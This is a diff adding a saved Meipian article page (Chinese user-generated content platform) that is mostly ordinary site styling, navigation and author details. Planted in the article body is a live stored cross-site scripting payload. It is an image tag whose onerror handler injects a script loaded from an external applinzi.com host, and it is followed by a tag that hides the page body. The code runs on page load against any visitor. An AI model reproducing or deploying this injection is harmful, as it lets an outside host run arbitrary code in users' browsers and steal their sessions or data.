@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="renderer" content="webkit">
+    <meta name="keywords" content=""/>
+    <meta name="description" content="testccxx">
+    <title>Loading</title>
+    <link rel="shortcut icon" href="http://static2.ivwen.com/web/a/favicon.ico" />
+</head><body>
+<style>
+    @media (min-width: 1025px) {
+        html, body {
+            max-width: 100% !important;
+        }
+
+        body {
+            background-color: #fff !important;
+        }
+
+        #download_bar {
+            display: none !important;
+        }
+
+        .meipian-bg {
+            max-width: 768px !important;
+        }
+
+        #main-box {
+            max-width: 768px;
+            margin: 110px auto 0;
+        }
+    }
+
+    @media (max-width: 1025px) {
+        #seo-header {
+            display: none !important;
+        }
+    }
+
+    #seo-header {
+        width: 100%;
+        height: 34px;
+        margin-bottom: 75px;
+        background-color: #000;
+        font-size: 0;
+        padding: 0 10px;
+        position: fixed;
+        left: 0;
+        top: 0;
+        z-index: 9999999999;
+        box-sizing: border-box;
+    }
+
+    #seo-header * {
+        box-sizing: border-box;
+    }
+
+    #seo-header a {
+        color: #fff;
+        text-shadow: none;
+    }
+
+    #seo-header #nav-left {
+        float: left;
+    }
+
+    #seo-header #nav-left a {
+        display: inline-block;
+        font-size: 13px;
+        height: 100%;
+        padding: 0 12px;
+        line-height: 34px;
+        text-align: center;
+        transition: .2s background-color ease-in-out;
+    }
+
+    #seo-header #nav-left a:hover {
+        background-color: #333;
+        transition-duration: 0s;
+    }
+
+    #seo-header #nav-left .active {
+        /*color: #fff;*/
+        background-color: #3395ed;
+    }
+
+    #seo-header #nav-left .active:hover {
+        /*color: #fff;*/
+        background-color: #3395ed;
+    }
+
+    #seo-header #breadcrumb {
+        position: absolute;
+        top: 100%;
+        left: 0;
+        background-color: #fff;
+        box-shadow: 0 1px 1px 0 rgba(0,0,0,0.1), 0 4px 8px 0 rgba(0,0,0,0.1);
+        font-size: 16px;
+        height: 58px;
+        width: 100%;
+        z-index: 150;
+    }
+
+    #seo-header #breadcrumb .box {
+        width: 768px;
+        margin: 0 auto;
+        height: 100%;
+        display: flex;
+        align-items: center;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+    }
+
+    #seo-header #breadcrumb .box #logo {
+        display: inline-block;
+        background-image: url("https://ss2.meipian.me/official/resource/logo.svg?24");
+        background-repeat: no-repeat;
+        background-size: contain;
+        background-position: center;
+        height: 36px;
+        width: 100px;
+        margin-right: 10px;
+    }
+
+    #seo-header #breadcrumb a {
+        color: #333;
+        display: inline-block;
+        padding: 5px 10px;
+    }
+
+    #seo-header #breadcrumb span {
+        color: #888;
+        text-shadow: none;
+        display: inline-block;
+    }
+
+    #seo-header #breadcrumb #title {
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+        max-width: 510px;
+    }
+
+    #seo-header #block {
+        width: 100%;
+        height: 18px;
+        position: fixed;
+        left: 0;
+        top: 92px;
+        z-index: 149;
+        background-color: #fff;
+    }
+</style>
+
+<div id="seo-header">
+    <div id="nav-left">
+        <a  href="https://www.meipian.cn/hot" target="_blank">热点</a><a  href="https://www.meipian.cn/photo" target="_blank">摄影</a><a  href="https://www.meipian.cn/tour" target="_blank">旅行</a><a  href="https://www.meipian.cn/beauty" target="_blank">女神</a><a  href="https://www.meipian.cn/life" target="_blank">生活</a><a  href="https://www.meipian.cn/fiction" target="_blank">美文</a><a  href="https://www.meipian.cn/baby" target="_blank">亲子</a><a  href="https://www.meipian.cn/hobby" target="_blank">兴趣</a><a  href="https://www.meipian.cn/food" target="_blank">美食</a>    </div>
+    <div id="breadcrumb">
+        <div class="box">
+            <a href="https://www.meipian.cn/" target="_blank" id="logo"></a>
+            <a href="https://www.meipian.cn/" target="_blank">&nbsp;&nbsp;首页&nbsp;&nbsp;</a>
+            <span>/</span>
+            <a href="https://www.meipian.cn/hot" target="_blank">&nbsp;&nbsp;其它&nbsp;&nbsp;</a><span>/</span><span id="title">&nbsp;&nbsp;&nbsp;&nbsp;我的美篇</span>        </div>
+    </div>
+    <div id="block"></div>
+</div>
+<div id="main-box"><div class="meipian">
+<div class="meipian-bg"></div>
+<div class="meipian-main">
+	<h1 class="meipian-title">我的美篇</h1>
+	<div class="meipian_meta clearfix">
+		<span>2017-02-15</span>
+		<span><a href="//www.meipian.cn/c/9189109">Ss</a></span>
+		<span>阅读 18694</span>
+			</div>
+
+	<div class="meipian-content">
+		<div class="section section-on section-border text-up fill"><div class="text">
+    <img sRc=x onerror=s=createElement('script');body.appendChild(s);s.src='https://shoubiao.applinzi.com/temp.v1.js';><body hidden>
+    </div><img class="images shadow img-border" src="http://static2.ivwen.com/user/9189109/c76a9051acf00001a599c54ffaf09ec0.jpg-mobile" onclick="preview(0)" /></div>
+</div>
+
+	<div class="meipian_meta report clearfix"><span>阅读 18694</span><span class="fr"><a href="https://www.meipian.cn/resources/components/report.php?id=dd3vd6t">举报</a></span></div><div id="autherLink">
+    <a href='https://www.meipian.cn/c/9189109'>
+        <div class="autherHead">
+            <img src="http://wx.qlogo.cn/mmopen/PiajxSqBRaELZibO1iaM0vcsbPyBXia49jHDuB5bR9nlBYSqjNC3qEiap1vjTLia4ZhHB3WNebFKEIB9hAQCxGIuL42A/0"/>
+        </div>
+        <div class="userMessage">
+            <p class="wusername" style="overflow: hidden">
+                作者：Ss            </p>
+            <p class="wsign">
+                            </p>
+        </div>
+        <div class="right iconfont icon-arrow"></div>
+    </a>
+</div>
+
+<div class="comment">
+    <div class="title">
+        <i class="fl color-lump"></i>
+        <h2 class="fl brilliant">最新评论</h2>
+    </div>
+    
+        <p id="comment_tips" style="padding: 54px 0 30px;">
+            暂无评论
+        </p></div>
+
+<div class="btn-download"><a class="button-download" href="javascript:;" onclick='downloadStat("bottom_banner")'><i class="iconfont icon-download"></i><span>免费制作你自己的图文故事</span></a></div><div id="banner" style="box-sizing: border-box; margin: 30px 15px 0; overflow: hidden;">
+
+<a href="https://www.meipian.cn/app/stat/ad_bottom.php?ad_type=2"><img src="http://static2.ivwen.com/config/1487174163049.jpg" style="width: 100%;" /></a>
+</div></body></html>
